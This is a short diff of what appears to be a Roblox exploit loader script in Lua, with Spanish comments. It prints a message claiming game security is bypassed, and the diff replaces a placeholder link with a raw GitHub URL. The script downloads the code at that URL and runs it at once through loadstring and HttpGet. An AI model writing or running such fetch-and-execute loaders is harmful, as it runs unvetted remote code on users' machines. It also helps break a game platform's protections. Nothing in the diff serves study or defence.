@@ -16,4 +16,4 @@ print("System: Security fully bypassed. Injecting Core...")
 task.wait(2) 
 
 -- CARGA EL ANILLO 4: EL SCRIPT BUENO (EL QUE TIENE EL PODER)
-loadstring(game:HttpGet("https://tu-link-privado.com/el-script-bueno.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zhubx2867-beep/Proyectos-X/refs/heads/main/X1"))()
